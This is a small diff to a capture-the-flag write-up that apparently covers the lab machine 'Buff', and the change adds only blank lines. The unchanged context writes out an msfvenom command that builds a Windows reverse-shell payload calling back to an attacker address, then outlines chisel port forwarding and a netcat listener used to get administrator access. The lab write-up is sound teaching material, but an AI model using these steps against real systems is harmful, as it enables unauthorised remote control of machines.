@@ -80,8 +80,10 @@ Since python is not installed in the victim box we can use port forwarding to ex
 1. To create the payload
    `sudo msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.14.103 LPORT=1337 -f py -v payload`
 2. Locally open chisel in server mode
+   
    ![](../../.gitbook/assets/buff-client-chisel.png)
 3.  Remotely execute chisel in client mode
+
    ![](../../.gitbook/assets/buff-serverchisel.png)
 
 So we have created the tunnel to forward the payload to the app so now we can execute the python script that sends the payload open a netcat listener and get administration access on the box.
